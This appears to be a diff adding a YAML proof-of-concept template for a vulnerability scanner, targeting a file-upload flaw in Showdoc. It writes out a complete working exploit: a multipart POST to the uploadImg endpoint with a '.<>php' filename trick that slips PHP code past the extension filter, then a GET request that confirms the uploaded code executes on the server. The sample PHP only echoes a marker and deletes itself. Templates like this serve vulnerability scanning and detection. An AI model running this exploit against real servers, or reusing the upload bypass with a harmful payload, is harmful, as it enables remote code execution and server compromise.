@@ -1,0 +1,43 @@
+id: poc-yaml-showdoc-uploadfile
+info:
+  name: Showdoc Uploadfile
+  severity: high
+  tags:
+  - 文件上传
+  finger: Showdoc
+  reference: []
+  description: null
+variables:
+  r1: random_str(4)
+  r2: random_str(4)
+transport: http
+requests:
+- method: POST
+  path: /index.php?s=/home/page/uploadImg
+  headers:
+    Content-Type: multipart/form-data; boundary=--------------------------835846770881083140190633
+  data: '----------------------------835846770881083140190633
+
+    Content-Disposition: form-data; name="editormd-image-file"; filename="{{.r1}}.<>php"
+
+    Content-Type: text/plain
+
+
+    <?php echo "{{.r2}}"; unlink(__FILE__); ?>
+
+    ----------------------------835846770881083140190633--'
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, "success")
+  output:
+  - regex_match(body,"(?P<date>\\d{4}-\\d{2}-\\d{2})\\\\/(?P<file>[a-f0-9]+\\.php)")
+- method: GET
+  path: /Public/Uploads/{{.date}}/{{.file}}
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, r2)
+  output: []
